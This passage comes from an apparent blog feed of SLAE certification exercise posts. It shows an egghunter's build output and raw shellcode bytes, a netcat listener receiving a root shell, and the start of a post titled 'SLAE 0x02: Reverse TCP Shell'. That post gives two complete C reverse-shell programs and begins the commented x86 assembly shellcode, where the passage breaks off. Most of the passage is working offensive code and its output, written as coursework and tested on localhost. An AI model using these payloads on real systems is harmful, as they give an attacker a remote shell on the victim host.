<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure
</span><span class='line'>Using listening port: 0x9210
</span><span class='line'>Using remote host: 0x0101017f
</span><span class='line'>Using remote port: 0x9210
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x03-egghunter/
</span><span class='line'><span class="nv">$ STAGE2</span><span class="o">=</span>../0x02-reverse/reverse make
</span><span class='line'>nasm  -f elf32 -o egghunter.o egghunter.asm
</span><span class='line'>ld -N -zexecstack -o egghunter egghunter.o
</span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
</span><span class='line'> 8048060:       <span class="nb">fc                      </span>cld
</span><span class='line'> 8048061:       <span class="m">31</span> db                   xor    ebx,ebx
</span><span class='line'>
</span><span class='line'><span class="m">08048063</span> &lt;egg_restart&gt;:
</span><span class='line'> 8048063:       6a <span class="m">28</span>                   push   0x28
</span><span class='line'> 8048065:       <span class="m">58</span>                      pop    eax
</span><span class='line'> 8048066:       <span class="m">43</span>                      inc    ebx
</span><span class='line'> 8048067:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
</span><span class='line'> 8048069:       3c f2                   cmp    al,0xf2
</span><span class='line'> 804806b:       <span class="m">75</span> <span class="m">07</span>                   jne    <span class="m">8048074</span> &lt;egg_check&gt;
</span><span class='line'> 804806d:       <span class="m">66</span> <span class="m">81</span> cb ff 0f          or     bx,0xfff
</span><span class='line'> 8048072:       eb ef                   jmp    <span class="m">8048063</span> &lt;egg_restart&gt;
</span><span class='line'>
</span><span class='line'><span class="m">08048074</span> &lt;egg_check&gt;:
</span><span class='line'> 8048074:       b8 bd ba fe ca          mov    eax,0xcafebabd
</span><span class='line'> 8048079:       <span class="m">40</span>                      inc    eax
</span><span class='line'> 804807a:       <span class="m">89</span> df                   mov    edi,ebx
</span><span class='line'> 804807c:       af                      scas   eax,DWORD PTR es:<span class="o">[</span>edi<span class="o">]</span>
</span><span class='line'> 804807d:       <span class="m">75</span> e4                   jne    <span class="m">8048063</span> &lt;egg_restart&gt;
</span><span class='line'> 804807f:       ff e7                   jmp    edi
</span><span class='line'>Shellcode size: 33
</span><span class='line'><span class="se">\x</span>fc<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>6a<span class="se">\x</span>28<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>3c<span class="se">\x</span>f2<span class="se">\x</span>75<span class="se">\x</span>07<span class="se">\x</span>66<span class="se">\x</span>81<span class="se">\x</span>cb<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>eb<span class="se">\x</span>ef<span class="se">\x</span>b8<span class="se">\x</span>bd<span class="se">\x</span>ba<span class="se">\x</span>fe<span class="se">\x</span>ca<span class="se">\x</span>40<span class="se">\x</span>89<span class="se">\x</span>df<span class="se">\x</span>af<span class="se">\x</span>75<span class="se">\x</span>e4<span class="se">\x</span>ff<span class="se">\x</span>e7
</span><span class='line'>cc -DEGGHUNTER<span class="o">=</span><span class="sb">`</span>asm-opcodes egghunter<span class="sb">`</span> -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x02-reverse/reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc -lv 127.1.1.1 4242
</span><span class='line'>Listening on <span class="o">[</span>127.1.1.1<span class="o">]</span> <span class="o">(</span>family 0, port 4242<span class="o">)</span>
</span><span class='line'>Connection from localhost <span class="m">51918</span> received!
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="c"># ./shellcode</span>
</span><span class='line'>Egghunter length: 33
</span><span class='line'>Shellcode length: 74
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x02: Reverse TCP Shell]]></title>
    <link href="http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell/"/>
    <updated>2018-05-21T20:39:57+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/05/21/slae-0x02-reverse-tcp-shell</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>

<figure class='code'><figcaption><span>connect(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just like <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a>, the second argument has to be manually packed with the IP address and port to connect to:</p>

<figure class='code'><figcaption><span>retrieving the system call number and constants</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall connect
</span><span class='line'><span class="c">#define __NR_connect 362</span>
</span><span class='line'>0x16a
</span><span class='line'><span class="nv">$ </span>python -c <span class="s1">&#39;import socket; print socket.AF_INET&#39;</span>
</span><span class='line'>2
</span></code></pre></td></tr></table></div></figure>


<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 362                |      +---------------------------------+ H
| ebx      | socket(2) fd       |      | IP address (network byte order) |
| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order)       |
| edx      | 16                 |      | AF_INET (2)                     |
+----------+--------------------+      +---------------------------------+ L
</code></pre>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;limits.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;strings.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span>
</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">exec_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">endptr</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span>                      <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">long</span>                     <span class="n">port</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span>       <span class="n">sa</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;usage: host port&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">port</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endptr</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;not a number&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">ERANGE</span> <span class="o">||</span> <span class="p">(</span><span class="n">port</span> <span class="o">&lt;=</span> <span class="mi">1024</span> <span class="o">||</span> <span class="n">port</span> <span class="o">&gt;=</span> <span class="mi">65536</span><span class="p">))</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;port out of range&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;socket&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sa</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sa</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;connect&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="n">exec_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">exec_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;execve&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* NOTREACHED */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Again, one should just use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> instead. This has the advantage of also being protocol agnostic:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netdb.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span>
</span><span class='line'><span class="nf">reverse_try</span><span class="p">(</span><span class="k">struct</span> <span class="n">addrinfo</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">warn</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>      <span class="n">warn</span><span class="p">(</span><span class="s">&quot;connect&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span>
</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span>            <span class="o">*</span><span class="n">exec_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>  <span class="kt">int</span>              <span class="n">ai_ret</span><span class="p">,</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">addrinfo</span>  <span class="n">ai_hints</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">addrinfo</span> <span class="o">*</span><span class="n">ai_ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">ai_srv</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;usage: host port&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ai_hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">ai_hints</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ai_ret</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">ai_hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ai_srv</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;getaddrinfo: %s&quot;</span><span class="p">,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">ai_ret</span><span class="p">));</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ai_ptr</span> <span class="o">=</span> <span class="n">ai_srv</span><span class="p">;</span> <span class="n">ai_ptr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">ai_ptr</span> <span class="o">=</span> <span class="n">ai_ptr</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">reverse_try</span><span class="p">(</span><span class="n">ai_ptr</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ai_ptr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;failed to connect&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">ai_srv</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="n">exec_args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">exec_args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;execve&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* NOTREACHED */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the commented shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">set</span> <span class="no">edx</span> <span class="no">to</span> <span class="no">zero</span> <span class="no">as</span> <span class="no">well</span><span class="p">,</span> <span class="no">by</span> <span class="no">sign</span> <span class="no">extending</span> <span class="no">eax</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x167</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">socket</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x2</span>                <span class="err">;</span> <span class="no">PF_INET</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">ebx</span>                 <span class="err">;</span> <span class="no">domain</span>
</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x1</span>                <span class="err">;</span> <span class="no">SOCK_STREAM</span>
